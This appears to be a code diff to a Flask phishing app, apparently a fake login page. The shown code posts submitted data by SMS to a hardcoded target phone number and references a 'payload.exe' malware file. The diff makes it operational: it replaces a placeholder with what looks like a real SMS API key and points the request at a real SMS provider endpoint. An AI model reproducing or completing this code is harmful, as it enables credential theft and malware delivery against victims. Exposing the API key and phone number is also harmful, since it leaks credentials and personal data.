@@ -9,7 +9,7 @@ app = Flask(__name__)
 
 # CONFIGURATION
 TARGET_PHONE = "+233545274761"
-SMS_API_KEY = "YOUR_SMS_API_KEY_HERE"  # Replace with Twilio or similar API Key
+SMS_API_KEY = "tlv_frF1Im4yaSmzfdxTaejLQxzgVF04vkjJC3CiE5VyzEk"  # Replace with Twilio or similar API Key
 MALWARE_PATH = "payload.exe"
 
 @app.route('/')
@@ -31,7 +31,7 @@ def login():
             "message": message,
             "api_key": SMS_API_KEY
         }
-        requests.post("https://api.sms-provider.com/send", json=payload)
+        requests.post("https://v4.api.termii.com/", json=payload)
     except Exception as e:
         print(f"SMS Error: {e}")
 
@@ -40,3 +40,4 @@ def login():
 
 if __name__ == '__main__':
     app.run(debug=False, port=5000, host='0.0.0.0')
+    
